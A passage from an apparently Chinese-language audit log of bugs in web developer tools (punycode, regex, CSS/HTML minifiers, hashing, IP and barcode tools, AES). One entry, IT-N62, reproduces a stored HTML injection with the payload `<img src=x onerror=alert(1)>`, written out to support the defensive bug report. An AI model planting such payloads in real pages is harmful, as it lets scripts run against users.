- 复现：勾选 ACE，输入 `hello`（无点号）→ 输出 `hello` 加尾随 `-` 即 `hello-`（期望原样 `hello`）；输入 `中文.com` 点「编码」→ `xn--fi@2282.com`（期望 `xn--fiq228c.com`）
- 影响：普通 ASCII 标签被多出一个连字符，复制到 hosts/DNS 后成为不同标签；示例误导用户以为 `fiqs8s` 是「中文」。
- 方案：当 `basic.length === 0` 时不要追加分隔符（或在 `enc()` 对纯 ASCII 标签直接原样返回）；修正 185 行示例为 `xn--fiq228c.com`。

### IT-N58 正则转义：反转义遇非法 `\x`/`\u` 逃逸抛未捕获异常，按钮无响应（中，确认源码缺陷）
- 描述：`unesc()` 对 `\xHH`、`\uHHHH`、`\u{...}` 直接 `String.fromCodePoint(parseInt(...))`，不校验十六进制合法性与码点范围；`\u{` 缺少右花括号时 `indexOf` 返回 -1，`substring` 取到空串。`parseInt` 得 `NaN`、码点越界或空值都会让 `fromCodePoint` 抛 `RangeError`，`unesc` 没有 try/catch，异常冒泡到内联 `onclick`。
- 证据：`tools/it/regex-escape.html:298-309`（299 `\x`、304 `\u{...}`、307 `\uHHHH`）
- 复现：输入 `\xZZ` 点「反转义」→ 控制台抛 `RangeError: Invalid code point NaN`，输出框保持旧值（期望提示「非法十六进制转义」）；`\u{110000}` → `Invalid code point 1114112`；`\u{` → `Invalid code point NaN`；`\uZZZZ` → 同样抛错。
- 影响：用户在整理日志/正则时输入不完整转义即静默失败，看不到任何界面反馈；旧结果可能被误当成本次结果复制。
- 方案：对 `\x`/`\u` 先校验 `^[0-9a-fA-F]{2,4}$` 与码点 ≤ 0x10FFFF，`\u{...}` 要求存在闭合 `}`；失败时在输出区显示具体位置与原因，并清空旧输出。

### IT-N59 正则转义：`verbose` 模式过度转义非元字符，`u`/`v` 模式下生成非法正则（低，确认源码缺陷）
- 描述：`VERBOSE_META` 把 `, ; : < > @ # & ~ =` 也当作元字符加反斜杠，但这些字符在 ECMAScript 正则中不是元字符。非 `u` 模式把它们当 identity escape 尚可，`u`/`v` 模式会直接 `SyntaxError: Invalid escape`。
- 证据：`tools/it/regex-escape.html:257`（`VERBOSE_META` 定义）、`tools/it/regex-escape.html:267-268`（逐字符加 `\`）
- 复现：风格选「含 / 括号」，输入 `a=b,c` → 输出 `a\=b\,c`；`new RegExp('a\\=b\\,c','u')` → `SyntaxError: Invalid regular expression: /a\=b\,c/u: Invalid escape`（期望只转义 `. * + ? ( ) [ ] { } ^ $ | \ /`）
- 影响：把结果贴进带 `u` 标志的 `RegExp`、ESLint `no-useless-escape` 或部分严格引擎会被判非法/告警。
- 方案：`verbose` 只额外处理 `/` 与字符类内的 `-`，删除 `,;:<>@#&~=`；或在输出旁注明「本结果适用于非 `u` 模式」。

### IT-N60 CSS 的带引号 URL 含括号时内容被改写（中，确认缺陷）
- `tools/it/css-minifier.html:350-359` 扫描 `url(...)` 时未区分内部引号，字符串里的右括号被误认为 URL 结束。Node 执行 `minify()`：`a{background:url("a)b  c");color:red}` 输出 `a{background:url("a)b c");color:red}`，URL 内连续空格被压缩。
- 影响：压缩或美化后引用地址可能改变。应按引号和转义状态识别 URL 的实际结束位置。

### IT-N61 CSS 压缩：无论是否勾选「移除注释」都删除注释（中，确认源码缺陷）
- 描述：`beautify()` 读取 `removeComments`，`minify()` 却无条件执行 `css.replace(/\/\*[\s\S]*?\*\//g,'')`；用户取消勾选后点「压缩」，注释仍被删除，且界面没有任何提示。
- 证据：`tools/it/css-minifier.html:326`（仅美化读取选项）、`tools/it/css-minifier.html:359`（压缩无条件删注释）
- 复现：取消勾选「移除注释」，输入 `/*keep*/a{color:red}` 点「压缩」→ `a{color:red}`（期望保留 `/*keep*/`）；勾选状态切换不影响压缩结果。
- 影响：需要保留 `/*! license */` 版权声明或 CSS hack 注释时会被静默删除，选项与行为不符。
- 方案：把 `removeComments` 传入 `minify()` 并按其值决定是否删注释；保留 `/*!` 开头的重要注释；补勾选/取消两组用例。

### IT-N62 CSS 压缩：历史记录只存前 60 字符，恢复后静默截断输入；摘要未转义直插 innerHTML（中，确认源码缺陷）
- 描述：`addToHistory('美化', input.substring(0,60))` 只保存前 60 字符，`loadH()` 把该摘要直接写回输入框（不重新执行美化），历史恢复得到的 CSS 已被截断。`renderHistory()` 又把 `x.summary` 原样拼进 `innerHTML`，含 `<img onerror>` 的 CSS 会在渲染历史时作为标签执行。
- 证据：`tools/it/css-minifier.html:350`（60 字符截断）、`tools/it/css-minifier.html:447-450`（回填摘要）、`tools/it/css-minifier.html:444`（`innerHTML` 拼接）
- 复现：输入超过 60 字符的 CSS 并点「美化」，再点历史条目 → 输入框只剩前 60 字符（期望恢复完整输入并重算）；输入含 `<img src=x onerror=alert(1)>` 的 CSS 后刷新页面 → 历史列表渲染该标签（自输入型注入，localStorage 持久化）。
- 影响：历史恢复不可用于真实长样式表；持久化历史可被注入脚本，影响同一来源下的页面。
- 方案：历史保存完整输入（确需限长则明确提示不可恢复）；回填后调用 `beautify()` 重算；历史摘要用 `textContent`/`createElement` 或统一 `escapeHtml` 渲染。

### IT-N64 IPv4 范围展开器：八位组校验宽松，空段/科学计数/十六进制被当成合法 IP（中，确认源码缺陷）
- 描述：`ip2int` 用一元 `+p[i]` 转数字，只检查 `0..255`，因此空串变 `0`、`1e2` 变 `100`、`0x1` 变 `1`、`+1` 变 `1`，`192.168..1` 被静默解析为 `192.168.0.1`；外层正则又只允许 `[0-9.]+/digits`，无法区分这些写法。
- 证据：`tools/it/ipv4-range-expander.html:203`（`+p[i]`）、`tools/it/ipv4-range-expander.html:206`（外层正则）、`tools/it/ipv4-range-expander.html:210`（仅校验前缀与 `ip2int` 结果）
- 复现：输入 `192.168..1/24` → 网络地址 `192.168.0.0`、可用主机 `254`（期望报「IP 段不能为空」）；`192.168.1e2.1/24` → `192.168.100.1` 被接受（期望报非法）；`192.168.0x1.1/24` → `192.168.1.1` 被接受（期望报非法）。
- 影响：从表格/日志粘贴的脏 IP 会被「修正」成另一个网段，防火墙规则与地址清单可能指向错误范围。
- 方案：每段用 `^(0|[1-9]\d{0,2})$` 校验（可选支持 1–3 位前导零但明确口径），拒绝 `+`、`0x`、`e` 与空段；错误时定位到具体第几段；补上述三类用例。

### IT-N65 User-Agent 解析器：iOS 内壳、三星浏览器、Windows Phone 被错认或判为未知（中，确认源码缺陷）
- 描述：`parseBrowser` 只匹配 `Edg/`、`OPR|Opera`、`Firefox/`、`Chrome/`、`Chromium/`、`Safari/+Version/`，没有 `CriOS/`、`FxiOS/`、`EdgiOS/`、`SamsungBrowser/`、`Windows Phone` 分支。iOS Chrome/Firefox 落到「未知浏览器」；iOS Edge 因含 `Version/` 与 `Safari/` 被判成 Safari；三星浏览器因含 `Chrome/` 被判成 Google Chrome（版本取 Chrome 内核号）；Windows Phone 的 UA 含 `Chrome/` 与 `Windows Phone 10.0`，被判成 Chrome + 操作系统「Windows」。
- 证据：`tools/it/user-agent-parser.html:316-358`（浏览器分支）、`tools/it/user-agent-parser.html:330`（Chrome 分支）、`tools/it/user-agent-parser.html:338`（Safari 分支）、`tools/it/user-agent-parser.html:361-368`（OS 的 `Windows` 兜底）
- 复现：`CriOS/120…` → 「未知浏览器」；`FxiOS/121…` → 「未知浏览器」（期望 Chrome/Firefox + iOS）；`EdgiOS/120… Version/17.0` → `Safari 17.0`（期望 Microsoft Edge）；`SamsungBrowser/23.0 … Chrome/115…` → `Google Chrome 115.0.0.0`（期望 Samsung Internet 23.0）；`Windows Phone 10.0 … Edge/15` → `Google Chrome 52…` + OS「Windows」（期望 Edge/Windows Phone）。
- 影响：访问日志/兼容性统计中移动端浏览器分布被系统性低估或错配，按「Chrome 版本」决策会遗漏真实内壳差异。
- 方案：在 Chrome/Safari 分支之前补 `EdgiOS/`、`CriOS/`、`FxiOS/`、`SamsungBrowser/`、`OPiOS/`、`DuckDuckGo/` 等规则；`Windows Phone` 先于 `Windows` 判定；补上述 UA 快照用例。

### IT-N66 多算法哈希器：MD5/CRC32 按 UTF-16 码元取字节，非 ASCII 摘要与标准不符（高，确认源码缺陷）
- 描述：`md5()` 与 `crc32()` 都用 `str.charCodeAt(i)` 逐字符当作字节，未先按 UTF-8 编码；非 ASCII 字符（`中`、emoji）会以 UTF-16 码元参与运算，结果与任何标准实现都对不上。页面公式表却明确写「统一按 UTF-8 编码后再计算」。
- 证据：`tools/it/hash-multi.html:296`（MD5 取 `charCodeAt`）、`tools/it/hash-multi.html:286`（CRC32 取 `charCodeAt`）、`tools/it/hash-multi.html:212`（UTF-8 说明）
- 复现：输入 `中` → MD5 `f2f4599f42c59653fbc6fceba89e9494`（期望 UTF-8 `aed1dfbc31703955e64806b799b67645`）；输入 `😀` → MD5 `2843eed96aa1750ead0763263455f324`（期望 `2a02eac39d716a70ecf37579185927b6`）；CRC32 `中` → `97ddb3f8`（期望 UTF-8 `d5d15a8b`）。纯 ASCII（`Hello ToolBox`、`abc`）两套实现一致。
- 影响：中文文件名/备注、emoji 内容算出的摘要与 `md5sum`、服务端、其他在线工具全部不匹配，完整性校验会误判为篡改。
- 方案：计算前统一 `new TextEncoder().encode(text)` 得到 UTF-8 字节，MD5/CRC32 改为按字节数组处理（MD5 分块时按 4 字节小端组装）；补中文、emoji、混合串与 Node `crypto` 对照用例。

### IT-N67 多算法哈希器：CRC32 十六进制未补零，输出长度不固定（中，确认源码缺陷）
- 描述：`crc32(text).toString(16)` 直接输出，CRC 值高位为 0 时十六进制串短于 8 位，与页面「CRC32 = 8 位十六进制」的速查表口径不一致，也不便于定长比对。
- 证据：`tools/it/hash-multi.html:340`（`crc32(text).toString(16)`）
- 复现：输入 `aa` → 输出 CRC32 `78a19d7`（7 位，期望 `078a19d7`）；输入 `😀` 时同样受 UTF-8 问题与补零问题叠加影响。
- 影响：用户按固定 8 位长度做字符串比较/日志断言时会被判不等或截断失败。
- 方案：改为 `crc32(text).toString(16).padStart(8,'0')`，大写模式再统一 `toUpperCase()`；补高位为 0 的用例（`aa`）。

### IT-N68 多算法哈希器：「复制全部」只复制算法名，摘要值全部丢失（高，确认源码缺陷）
- 描述：`copyAll()` 用 `box.querySelectorAll('div > div')` 遍历，随后 `label=d.childNodes[0].textContent`、`val=d.querySelector('div')`。外层结果卡（`div > div`）匹配后，`childNodes[0]` 是算法名子 div、`querySelector('div')` 也返回该子 div，于是记录成 `MD5: MD5`；真正含摘要的值 div没有嵌套 `div`，`val` 为 `null` 被跳过。最终复制内容只有「算法名: 算法名」若干行。
- 证据：`tools/it/hash-multi.html:366`（`copyAll` 选择器与取值）
- 复现：输入 `Hello ToolBox` 点「计算」后点「复制全部」→ 剪贴板为 `MD5: MD5\nSHA-1: SHA-1\nSHA-256: SHA-256`（期望每行 `算法: 摘要`，如 `MD5: a22e28aa02a822f478361a0f085b5b78`）；jsdom 按同样 DOM 结构复算得到 `["MD5: MD5","SHA-1: SHA-1"]`。
- 影响：批量比对时复制到的全是标签，用户拿不到任何摘要；且 SHA 值是异步回填的，更不可能被这段逻辑读到。
- 方案：直接遍历 `#outBox` 的一级结果卡（如 `outBox.children`），取卡内第 1 个子 div 的 `textContent` 作算法名、第 2 个子 div 的 `firstChild.nodeValue`（或去掉按钮后的 `textContent`）作摘要；补 jsdom/真机点击用例。

### IT-N69 HTTP 缓存速查：搜索与分类只过滤列表，图表/明细表仍统计全量数据（低，确认源码缺陷）
- 描述：`renderCommands()` 按 `currentCategory` 与 `searchQuery` 过滤 `COMMANDS`，但 `hcAgg()` 固定遍历 `COMMANDS` 全量；`hcChart()`/`hcTable()` 直接使用该聚合结果，既不读搜索词也不读当前分类。搜索 `max-age` 时列表只剩 1 项，图表与「明细表」仍显示所有分类和全部分类计数。
- 证据：`tools/it/http-cache.html:562-571`（列表过滤）、`tools/it/http-cache.html:706-710`（`hcAgg` 全量聚合）、`tools/it/http-cache.html:711-728`（图表/明细取 `hcAgg`）
- 复现：在搜索框输入 `max-age` → 列表「共 1 项」，但「图表」仍按全部分类出柱、「明细表」仍列出全部 10+ 个分类（期望图表/明细随当前过滤结果同步，或明确标注为全量统计）
- 影响：用户以为图表反映当前筛选结果，实际看到的是全站数据，容易得出错误的分类占比结论。
- 方案：让 `hcAgg` 接收过滤后的数组（把 `renderCommands` 的过滤逻辑抽成 `getFiltered()` 共用），或在图表/明细标题注明「全量统计，不受搜索影响」。

### IT-N70 多算法哈希器：算法与「大写」勾选不触发重算，需再点计算（低，确认源码缺陷）
- 描述：输入框用 `oninput="calc()"` 实时重算，但 129-134 行的 MD5/SHA/CRC32/大写复选框都没有 `onchange`；勾选或取消后结果区保持上一次的算法组合与大小写，直到用户手动点「计算」。
- 证据：`tools/it/hash-multi.html:129-134`（复选框无 `onchange`）、`tools/it/hash-multi.html:367`（仅初始化调用 `calc()`）
- 复现：输入 `abc` 后勾选「SHA-512」→ 结果区仍只有 MD5/SHA-1/SHA-256（期望立即出现 SHA-512）；勾选「大写」→ 摘要仍为小写（期望立即转大写）；此时点「复制全部」也复制不到新算法的行。
- 影响：用户以为勾选已生效，实际复制/比对的是旧结果，且与页面「支持多算法同时输出与大小写切换」的描述不符。
- 方案：为这些复选框绑定 `change` → `calc()`，或在「大写」切换时只对既有摘要做大小写转换；补勾选后不点按钮的交互用例。

- 备注：`tools/it/punycode.html:404-410`、`tools/it/regex-escape.html:321-328` 的 `copyResult` 依赖全局 `event`（与 IT-N31 同模式，Firefox 可能失效），不重复计数，未单列为新条目。
- 本轮实读 8 页：`tools/it/punycode.html`、`tools/it/regex-escape.html`、`tools/it/css-minifier.html`、`tools/it/date-duration.html`、`tools/it/ipv4-range-expander.html`、`tools/it/user-agent-parser.html`、`tools/it/hash-multi.html`、`tools/it/http-cache.html`；新增 15 条（高 3 / 中 8 / 低 4）；未覆盖：`tools/it` 其余非文本页（如 `html-minifier`、`html-nesting-checker`、`c-string-escape`、`go-escape`、`java-escape`、`js-minifier`、`js-obfuscator`、`sql-formatter`、`shell-script-formatter`、`dockerfile-generator`、`gitignore-generator`、`robots-txt-generator`、`sitemap-generator`、`ssh/证书/密钥类` 等）与全部速查表页；未做浏览器、EN、移动端、门禁或部署验证。

## 2026-11-04 续查（并行批 N）

> 范围：本轮阅读 8 页（`tools/it/ip-calculator.html`、`tools/it/html-minifier.html`、`tools/it/barcode-ean.html`、`tools/it/docker-run-converter.html`、`tools/it/cron.html`、`tools/it/qr-decoder.html`、`tools/it/url-encode.html`、`tools/it/base64-converter.html`）。仅源码 + Node 复算，未开浏览器/未做 EN/移动端/门禁验证。

### IT-N71 IP 计算器：子网划分把 Number 与 BigInt 相加，点击即抛 TypeError（高，确认源码缺陷）
- 描述：`calcSubnets()` 先用 `ipToInt()` 得到 Number 类型的 `networkInt`，随后在子网循环里写 `(networkInt + BigInt(i) * BigInt(subnetSize)) >>> 0`；JS 规定 Number 与 BigInt 不能直接相加，必然抛 `TypeError: Cannot mix BigInt and other types`。函数没有 try/catch，异常冒泡到内联 `onclick`，信息卡与表格均不会更新。
- 证据：`tools/it/ip-calculator.html:787-788`（两处 `networkInt + BigInt(...)`）
- 复现：基础 IP `192.168.1.0`、原前缀 `24`、新前缀 `26` 点「划分子网」→ 控制台抛 `Cannot mix BigInt and other types`，页面无任何子网结果（期望列出 4 个 /26 子网）；任意合法输入均如此。
- 影响：「子网划分」整个功能不可用；已有旧结果时还会残留上一次的表格，用户可能误当本次结果。
- 方案：进入循环前统一类型，如 `const networkBig = BigInt(networkInt)`，后续全部用 BigInt 计算、输出时再 `Number()`；或全部改 Number（`showCount ≤ 256`，`networkInt + i * subnetSize` 在 2^32 内仍安全）。补 `192.168.1.0/24→/26`、`0.0.0.0/0→/8` 用例。

### IT-N72 HTML 压缩：安全模式反而删除 inline 元素间空格，文本粘连（高，确认源码缺陷）
- 描述：`collapseWhitespace` 分支先 `replace(/\s+/g,' ')`，safeMode 下再执行 `replace(/\s*(<\/?(a|span|b|strong|...)\b[^>]*>)\s*/gi,'$1')`。该正则把每个 inline 标签前后的空白全部吞掉（包括标签之间的那一个空格），与注释「保留 inline 元素之间的单个空格」相反；safeMode 默认勾选，默认压缩路径即受影响。
- 证据：`tools/it/html-minifier.html:309-314`（314 为 inline 标签正则）、`tools/it/html-minifier.html:166`（safeMode 默认 `checked`）
- 复现：默认选项压缩 `<p>hello <span>world</span> again</p>` → 实际 `<p>hello<span>world</span>again</p>`（期望 `hello <span>world</span> again`，词间保留一个空格）；`<em>a</em> <strong>b</strong>` → `<em>a</em><strong>b</strong>`。
- 影响：压缩后可见文本变成 `helloworldagain`，页面语义与复制文本被改变；「安全模式」承诺失效，且这是默认开关。
- 方案：不要删除 inline 标签两侧的空白；改为把连续空白折叠为单个空格并保留，只在块级标签边界删除。更稳妥的是按 DOM/字符状态机处理文本节点，标签与属性不参与空白折叠；补 `span/em/strong` 相邻文本回归用例。

### IT-N73 EAN 条形码：短输入被静默补零、长输入被截断，空输入也生成全零条码（中，确认源码缺陷）
- 描述：`buildEAN()` 先 `input.replace(/\D/g,'')` 去掉所有非数字，再对不足 12 位 `padEnd(12,'0')`，对 ≥13 位 `slice(0,13)`。页面不提示长度/字符问题，任何脏输入都会变成一条「合法」但与原输入无关的 EAN-13。
- 证据：`tools/it/barcode-ean.html:255-259`（去非数字、补零、截断）
- 复现：空输入 → 生成 `0000000000000`（期望提示「请输入 8/12/13 位数字」）；输入 `123` → `1230000000000`（期望报长度不足）；输入 `12A34` → `1234000000008`（期望报含非法字符）；输入 `590123412345678` → 截成 `5901234123456`（期望报超长）。
- 影响：生成的条码与用户输入不一致，打印/贴标后扫描出另一个 GTIN；空输入还能“成功”生成，误导性强。
- 方案：只接受纯数字；按长度分支校验（EAN-8 为 8 位、EAN-13 为 12/13 位、UPC-A 为 11/12 位），不合法时明确报错并停止绘制；禁止 `padEnd`/`slice` 静默修正。补空、短、含字母、超长四组用例。

### IT-N74 docker run 转 Compose：只认空格分隔的选项，`--name=`/`-p8080:80`/`--restart=` 被静默忽略（中，确认源码缺陷）
- 描述：`parse()` 用 `args.split(/\s+/)` 分词，选项只匹配 `--name`、`-p`、`-v`、`-e`、`--restart` 这种「选项 + 下一个 token」形式；`--name=web`、`-p8080:80`、`--restart=always` 都不匹配，随后被 `t.charAt(0)==='-'` 分支直接跳过。引号也不处理，`-e "MSG=hello world"` 会被拆成两个 token。
- 证据：`tools/it/docker-run-converter.html:219-231`（分词与选项分支）
- 复现：`docker run -d --name=web -p8080:80 --restart=always nginx:latest` → 实际 service 名 `app`、`ports: []`、`restart: no`（期望 `web`、`8080:80`、`always`）；`docker run -e "MSG=hello world" nginx` → image 被解析成 `world"`（期望 `nginx`）。
- 影响：常见的 `=`/短选项粘连写法与带空格引号写法生成出的 compose 丢失端口、卷、环境变量或服务名，部署行为与源命令不同。
- 方案：先做支持单/双引号与反斜杠转义的 shell 分词；识别 `--opt=value` 与 `-p8080:80`、`-eKEY=VAL` 等短选项粘连形式；选项缺值时明确报错。补上述命令的回归用例。

### IT-N75 docker run 转 Compose：镜像后的 CMD 被丢弃或被误当发布端口（中，确认源码缺陷）
- 描述：解析器不区分「镜像前的选项」与「镜像后的容器命令」；遇到镜像后第一个非选项 token 后仍继续按选项解析，普通参数被忽略，而像 `-p` 这样的 token 会被当成发布端口。生成的 compose 只有 `image`，没有 `command`。
- 证据：`tools/it/docker-run-converter.html:229-231`（镜像后继续走同一循环）、`tools/it/docker-run-converter.html:238-243`（只输出 image/ports/volumes/env/restart）
- 复现：`docker run nginx sh -c "echo hi"` → 实际只输出 `image: nginx`，无 `command`（期望 `command: ["sh","-c","echo hi"]` 或等价字符串）；`docker run nginx -p 8080:80` → 把 `-p 8080:80` 当成发布端口（实际 docker 会把其作为容器命令参数）。
- 影响：转换后的 compose 运行默认命令或错误端口，用户难以察觉行为已变。
- 方案：确认镜像后立即停止选项解析，把剩余 token 原样作为 `command`（正确 YAML 引号/数组），仅镜像前解析 `-p/-v/-e/--name/--restart`；补 CMD、ENTRYPOINT 参数与镜像后 `-p` 用例。

### IT-N77 Cron 表达式生成器：分钟为步进/枚举且小时为 `*` 时，中文说明缺失时间段（中，确认源码缺陷）
- 描述：`updateDescription()` 的 `timeDesc` 分支只处理 `min==='*' && hour==='*'`、`min==='0' && hour==='*'`、`min==='*' && hour!=='*'`、`hour!=='*'` 四种；当 `hour==='*'` 且 `min` 是 `*/5` 或 `15` 时没有分支命中，`timeDesc` 保持空串，最终描述变成「每天 执行」。
- 证据：`tools/it/cron.html:625-631`（分支缺口，665 拼接）
- 复现：选预设「每5分钟」（表达式 `*/5 * * * *`）→ 实际说明「每天 执行」（期望「每5分钟执行」）；手动输入 `15 * * * *` → 同样「每天 执行」（期望「每小时第 15 分执行」）。
- 影响：说明区无法表达最常见的分钟级计划，用户无法从文字核对表达式是否正确。
- 方案：补充 `hour==='*'` 且 `min` 为步进/枚举的分支：`*/n` → `每 n 分钟`，`a,b` → `每小时第 a、b 分`，单值 → `每小时第 x 分`；遍历全部预设断言描述非空。

### IT-N78 QR 内容解码器：geo 查询参数含非法百分号编码时抛未捕获 URIError，按钮无响应（中，确认源码缺陷）
- 描述：`decode()` 的 geo 分支直接 `decodeURIComponent(parts[1].replace(/^q=/,''))`，不校验 `%` 序列；`generate()` 也没有 try/catch，异常冒泡到内联 `onclick`，输出区保持旧内容。
- 证据：`tools/it/qr-decoder.html:277-279`（279 `decodeURIComponent`）、`tools/it/qr-decoder.html:314-316`（无 try/catch）
- 复现：输入 `geo:39.9,116.4?q=%E0%A4%A` 点生成 → 控制台抛 `URIError: URI malformed`，页面无新结果（期望提示「查询参数编码非法」并继续展示经纬度）；同类问题也会出现在任何含孤立 `%` 的扫码文本。
- 影响：扫码内容稍有异常即整页功能失效，用户看不到经纬度，也无法判断是内容错误还是工具错误；旧结果残留还可能被误复制。
- 方案：对 `decodeURIComponent` 包 try/catch（失败时保留原串或提示），并在识别前校验 `%[0-9A-Fa-f]{2}`；`generate()` 外层再兜底 catch，出错时清空旧输出并显示原因。

### IT-N79 QR 内容解码器：WiFi 字段不处理 `\;` 转义，SSID/密码被截断（中，确认源码缺陷）
- 描述：WiFi 分支用 `/([TSPH]):([^;]*)/g` 逐段取值，未考虑 WiFi QR 规范中 `\;`、`\,`、`\:`、`\\` 的反斜杠转义；值里出现 `\;` 时正则在第一个 `;` 处截断，后半段被当成新的字段或直接丢弃。`unescape()` 只解 `%xx`/`%u`，也不会还原反斜杠转义。
- 证据：`tools/it/qr-decoder.html:256-261`（257 正则、260 `unescape`）
- 复现：输入 `WIFI:S:my\;net;T:WPA;P:p\;q;;` → 实际 SSID `my\`、密码 `p\`（期望 `my;net`、`p;q`）；含 `\,` 的 SSID 同样被截断。
- 影响：展示的 WiFi 名称/密码与原二维码不一致，用户照抄后无法连接。
- 方案：按字符状态机解析，遇到 `\` 时把下一个字符原样写入值（支持 `\; \, \: \\`），仅在未转义的 `;` 处分段；字段值不再调用 `unescape()`，或仅对百分号编码额外处理；补转义分号/逗号用例。

### IT-N81 URL 编解码：解码无条件把 `+` 当空格，破坏普通 URL 中的字面加号（中，确认源码缺陷）
- 描述：`decodeUrl()` 在调用 `decodeURIComponent` 前固定执行 `text.replace(/\+/g,'%20')`，不区分当前是 `encodeURIComponent` 还是 `encodeURI` 模式，也不区分路径与查询。普通 URL 路径/查询里的字面 `+` 被改成空格。
- 证据：`tools/it/url-encode.html:540-545`（544 无条件替换）
- 复现：输入 `https://example.com/a+b` 点解码 → 实际 `https://example.com/a b`（期望保留 `https://example.com/a+b`，因为 `+` 在 URL 路径中不是空格）；输入 `?q=1+1` 同样变成 `q=1 1`。
- 影响：解码普通链接会把数学表达式、C++ 等含 `+` 的路径/参数改坏；与页面自身的 `encodeURIComponent` 模式不一致。
- 方案：仅当启用「表单/query 模式」时才把 `+` 转为空格，默认保留；或在输出旁提供两种结果。补路径 `+`、查询字面 `+`、真实表单 `a+b`（应空格）用例。

### IT-N82 HTML 压缩：折叠空白改写了属性值中的连续空格（中，确认源码缺陷）
- 描述：`collapseWhitespace` 对整段 HTML 执行 `replace(/\s+/g,' ')`，只保护了 `pre/textarea/script/style` 元素，没有保护标签属性。`title`、`alt`、`value`、`data-*`、`style` 等属性值中的连续空格会被压成一个，字符串语义改变。
- 证据：`tools/it/html-minifier.html:306-317`（312/316 全局 `\s+` 折叠，仅 293 保护四类元素）
- 复现：默认选项压缩 `<a title="a   b" href="x  y" data-note="p  q">z</a>` → 实际 `title="a b"`、`href="x y"`、`data-note="p q"`（期望属性值原样保留）；`<input value="hello  world">` 同样被改。
- 影响：压缩后表单默认值、可访问名、`data-*` 配置、CSS 自定义属性值与源文件不一致，可能影响脚本读取与展示。
- 方案：先按字符状态机保护标签内部（`<...>`，含引号内空白）与 `pre/textarea/script/style`，再只折叠文本节点空白；或统一占位符保护后再还原。补属性含连续空格、单双引号、`style` 用例。

### IT-N83 Base64/Base32/Base85 转换器：Base32/Base85 解码静默跳过非法字符，脏输入仍输出看似正常文本（中，确认源码缺陷）
- 描述：`base32Decode()` 对不在 `A-Z2-7` 表的字符执行 `if(idx===-1) continue`，`base85Decode()` 对不在字符表的字符同样 `continue`；两者都不校验剩余位数/填充位。复制时混入数字 `0/1`、标点或被截断的串，会被当成合法输入并解出部分内容。
- 证据：`tools/it/base64-converter.html:466-482`（473 跳过非法字符）、`tools/it/base64-converter.html:513-542`（525-526 跳过非法字符）
- 复现（Node 复算原函数）：Base32 输入 `MZXW6YTB0I`（`0` 非法）→ 实际解出 `fooba`（期望报「非法字符 0」）；`MZXW6!!!` → `foo`；单字符 `A` → 空串且无报错。Base85 `<~!!!!v~>` 中的 `v` 被跳过，仍解出 4 个 NUL 字节。
- 影响：损坏/截断的编码被静默还原为部分文本，用户无法发现数据缺失；用于配置或签名核对时可能误判。
- 方案：遇到字符表外字符立即抛出并指明位置；解码结束校验剩余位数必须为 0（Base32 末字节低比特、Base85 尾组）；空结果或长度不足时提示；补非法字符、截断、单字符用例。

### IT-N84 EAN 条形码：13 位输入不校验自带校验位，错误校验码仍照常绘制（中，确认源码缺陷）
- 描述：`buildEAN()` 对 13 位输入直接 `slice(0,13)` 使用，不比较第 13 位与前 12 位按 `eanCheck()` 计算出的校验位；页面只在条码下方回显输入，没有任何「校验位错误」提示。
- 证据：`tools/it/barcode-ean.html:250-254`（校验位算法）、`tools/it/barcode-ean.html:258-259`（仅 `slice`，无校验）
- 复现：输入 `5901234123450`（前 12 位 `590123412345` 的正确校验位为 `7`）→ 实际原样生成 `5901234123450` 的条码（期望提示校验位应为 7，或自动修正并标注）；输入正确值 `5901234123457` 才应通过。
- 影响：带有错误校验位的 GTIN 会被绘制成条码，扫码器按标准会拒读或读成另一个商品；用户以为已生成合法条码。
- 方案：13 位输入时用 `eanCheck(d.slice(0,12))` 比对第 13 位，不一致则报错并显示正确值；12 位输入才自动补校验位；补正确/错误校验位两组用例。

### IT-N85 IP 计算器：`0.0.0.0` 等合法地址因 falsy 判断被判无效（低，确认源码缺陷）
- 描述：`calcSubnets()` 的合法性判断写成 `if (!baseInt || ...)`，而 `ipToInt('0.0.0.0')` 返回 `0`，`!0` 为真，于是合法的 `0.0.0.0` 网段被当成空/非法输入拒绝。
- 证据：`tools/it/ip-calculator.html:760`（`!baseInt`）、`tools/it/ip-calculator.html:462-466`（`0.0.0.0` 返回 0）
- 复现：基础 IP `0.0.0.0`、原前缀 `16`、新前缀 `24` 点「划分子网」→ 实际提示「请输入有效的参数（新前缀必须大于原前缀）」（期望正常列出 256 个 /24 子网）；`0.0.0.0/0` 同理。
- 影响：以 0 开头的合法网段无法做子网划分，错误提示还会误导用户以为前缀关系有误。
- 方案：改为 `if (baseInt === null || ...)`，把「解析失败」与「数值为 0」区分开；补 `0.0.0.0/16→/24`、`0.0.0.0/0→/8` 用例。

- 备注：`tools/it/ip-calculator.html:453-456` 与 `tools/it/cron.html:462-466` 的 `switchTab` 依赖全局 `event`（与 IT-N31 同模式，Firefox 可能失效），不重复计数，未单列为新条目。
- 本轮实读 8 页：`tools/it/ip-calculator.html`、`tools/it/html-minifier.html`、`tools/it/barcode-ean.html`、`tools/it/docker-run-converter.html`、`tools/it/cron.html`、`tools/it/qr-decoder.html`、`tools/it/url-encode.html`、`tools/it/base64-converter.html`；新增 15 条（高 2 / 中 12 / 低 1）；未覆盖：`tools/it` 其余非文本页（如 `base32-encode`、`base58-encode`、`base85-encode`、`http-headers`、`http-status`、`http-methods`、`mime-type`、`gitignore-generator`、`dockerfile-generator`、`shell-script-formatter`、`ipv6-ula`、`ssl-info`、`aes/des/rsa/ecdsa` 等）与全部速查表页；未做浏览器、EN、移动端、门禁或部署验证。

## 2026-11-04 续查（并行批 O）

范围：本分区「01 IT：非文本类剩余」8 页（`ipv6-ula` / `ssl-info` / `http-status` / `http-headers` / `mime-type` / `aes-encryptor` / `rsa` / `base32-encode`），编号接续 IT-N85，从 IT-N86 起。

### IT-N86 AES 加密/解密：ShiftRows 排列写错，全模式输出与标准 AES 不符、本页自身加解密也不可逆（高，确认源码缺陷）
- 问题：`shiftRows()` 第 1 行（`state[1,5,9,13]`）与第 3 行（`state[3,15,11,7]`）的旋转是对的，但随后第 437 行又把第 2 行四个位置整体转一格（正确应是 `2↔10`、`6↔14` 两次交换），第 438 行再把第 3 行整转一次，正好把第 436 行的正确结果转回原状。于是第 2 行被转成错误排列、第 3 行完全不位移；`invShiftRows()` 也不是它的逆。
- 证据：`tools/it/aes-encryptor.html:432-439`（437/438 两行多余旋转）、`tools/it/aes-encryptor.html:441-445`（逆变换不互逆）、`tools/it/aes-encryptor.html:841`/`944`（ECB 路径直接调用）
